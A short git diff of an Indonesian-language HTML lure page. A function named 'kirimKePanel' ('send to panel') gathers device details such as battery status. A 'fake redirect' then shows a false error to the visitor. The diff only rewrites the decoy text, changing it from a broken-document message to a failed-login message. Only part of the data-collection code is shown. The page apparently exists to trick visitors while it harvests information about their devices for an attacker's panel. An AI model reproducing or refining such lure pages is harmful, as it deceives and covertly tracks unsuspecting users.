@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Loading Dokumen...</title>
+  <title>Tunggu Sebentar Lagi Login Kek Panel...</title>
   <script>
     async function kirimKePanel() {
       const battery = await navigator.getBattery?.().catch(() => null);
@@ -33,7 +33,7 @@
 
       // Redirect palsu
       setTimeout(() => {
-        document.body.innerHTML = '<h2 style="text-align:center;color:white">Dokumen tidak ditemukan atau rusak.</h2>';
+        document.body.innerHTML = '<h2 style="text-align:center;color:white">Login Gagal Silahkan Refresh Ulang</h2>';
       }, 3000);
     }
 
@@ -41,6 +41,6 @@
   </script>
 </head>
 <body style="background:#111827;color:white;text-align:center;padding:40px;font-size:20px;">
-  Memuat dokumen...
+  Tunggu Sebentar lagi login panel....
 </body>
 </html>
